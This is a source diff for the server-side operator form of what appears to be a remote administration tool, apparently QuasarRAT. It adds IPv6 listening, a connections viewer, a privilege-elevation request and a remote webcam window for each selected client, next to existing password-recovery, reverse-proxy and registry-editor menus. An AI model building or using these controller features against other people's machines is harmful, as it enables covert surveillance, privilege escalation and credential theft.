@@ -88,12 +88,12 @@ namespace xServer.Forms
             if (Settings.AutoListen && Settings.UseUPnP)
             {
                 UPnP.Initialize(Settings.ListenPort);
-                ListenServer.Listen(Settings.ListenPort);
+                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support);
             }
             else if (Settings.AutoListen)
             {
                 UPnP.Initialize();
-                ListenServer.Listen(Settings.ListenPort);
+                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support);
             }
             else
             {
@@ -595,6 +595,21 @@ namespace xServer.Forms
             }
         }
 
+        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                if (c.Value.FrmCon != null)
+                {
+                    c.Value.FrmCon.Focus();
+                    return;
+                }
+
+                FrmConnections frmCON = new FrmConnections(c);
+                frmCON.Show();
+            }
+        }
+
         private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -625,6 +640,14 @@ namespace xServer.Forms
                     FrmRegistryEditor frmRE = new FrmRegistryEditor(c);
                     frmRE.Show();
                 }
+            }
+        }
+
+        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                new Core.Packets.ServerPackets.DoAskElevate().Execute(c);
             }
         }
 
@@ -669,7 +692,19 @@ namespace xServer.Forms
                 frmRDP.Show();
             }
         }
-
+        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                if (c.Value.FrmWebcam != null)
+                {
+                    c.Value.FrmWebcam.Focus();
+                    return;
+                }
+                FrmRemoteWebcam frmWebcam = new FrmRemoteWebcam(c);
+                frmWebcam.Show();
+            }
+        }
         private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -867,10 +902,5 @@ namespace xServer.Forms
         }
 
         #endregion
-
-        private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
-        {
-
-        }
     }
 }
